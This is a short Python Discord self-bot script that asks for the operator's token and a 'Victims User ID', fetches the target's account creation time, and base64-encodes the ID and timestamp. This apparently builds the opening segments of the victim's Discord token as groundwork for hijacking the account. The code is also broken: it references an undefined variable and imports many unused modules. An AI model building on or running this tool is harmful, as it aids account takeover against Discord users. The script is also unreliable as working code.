import discord
import string
import requests as req
import datetime
import random
import time
import base64
from threading import Thread as thr
import os
import discord, os, json
from discord.ext import commands
from discord.ext.commands import Bot
from plyer import notification
from flask import Flask, request
app = Flask(__name__)

# Flask Is Black
token = input(f"Put Your Token Here: ")


class MyClient(discord.Client):
  async def on_ready(self):
    userid = input(f"Put The Victims User ID Here: ")
    user = await client.fetch_user(int(userid))
    stamp = user.created_at
    timestamp = str(time.mktime(stamp.timetuple()))
    print(timestamp)
    encodedBytes = base64.b64encode(userid.encode("utf-8"))
    encodedid = str(encodedBytes, "utf-8")
    encodedBytes = base64.b64encode(timestamp.encode("utf-8"))
    encodedstamp = str(encodedBytes, "utf-8")
    time.sleep(3)
    open("temp.txt", "w").write(encodeid)
    exit(0)
    
            
client = MyClient()
client.run(token, bot=False)
